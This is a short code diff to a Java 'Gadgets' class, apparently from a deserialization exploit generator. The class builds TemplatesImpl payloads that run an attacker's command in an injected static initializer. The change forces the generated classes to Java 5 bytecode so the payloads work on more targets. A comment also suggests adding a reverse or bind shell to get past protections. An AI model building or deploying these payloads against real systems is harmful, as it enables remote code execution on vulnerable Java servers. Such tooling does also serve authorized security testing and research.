@@ -93,8 +93,6 @@ public class Gadgets {
         }else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_BASE64)){
             classBytes = new BASE64Decoder().decodeBuffer(command.substring(CustomCommand.COMMAND_CLASS_BASE64.length()));
         } else {
-
-
             // run command in static initializer
             // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
             String cmd = TemplatesImplUtil.getCmd(command);
@@ -108,6 +106,7 @@ public class Gadgets {
             CtClass clsSerializable = pool.get("java.io.Serializable");
             clazz.setInterfaces(new CtClass[]{clsSerializable});
             clazz.addField(CtField.make("private static final long serialVersionUID = -5971610431559700674L;", clazz));
+            clazz.getClassFile().setVersionToJava5();
             classBytes = clazz.toBytecode();
         }
 
@@ -118,6 +117,7 @@ public class Gadgets {
         CtClass clsSerializable = pool.get("java.io.Serializable");
         foo.setInterfaces(new CtClass[]{clsSerializable});
         foo.addField(CtField.make("private static final long serialVersionUID = 8207363842866235160L;", foo));
+        foo.getClassFile().setVersionToJava5();
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
             classBytes, foo.toBytecode()
         });
@@ -150,6 +150,7 @@ public class Gadgets {
             clazz.makeClassInitializer().insertAfter(code);
             CtClass superC = classPool.get(AbstractTranslet.class.getName());
             clazz.setSuperclass(superC);
+            clazz.getClassFile().setVersionToJava5();
             classBytes = clazz.toBytecode();
         }
 
